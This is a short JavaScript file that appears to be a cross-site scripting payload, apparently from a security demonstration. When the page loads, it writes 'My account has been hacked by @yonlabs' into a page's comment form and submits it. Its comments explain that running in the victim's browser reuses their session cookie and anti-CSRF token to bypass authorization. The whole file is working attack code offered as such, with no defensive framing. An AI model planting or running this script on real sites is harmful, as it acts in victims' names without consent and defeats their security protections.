window.addEventListener('load', function () {
    // find the first form on a web page (in our case it's the one to add new comment)
    var form = document.getElementsByTagName('form')[0];
    // the comment input
    var comment = document.getElementById('comment');
    // change the value to our likeing
    comment.value = 'My account has been hacked by @yonlabs';
    // and simply send it to the server
    // (1) if a victim is logged in, the victim's browser will attach the correct cookie automatically
    // (2) if the system uses anti-CSRF tokens, we just use the token set for a form!
    // (3) basically being in the victim's browser context we can work-around any authorization
    // or any anti-CSRF protection!
    form.submit();
});
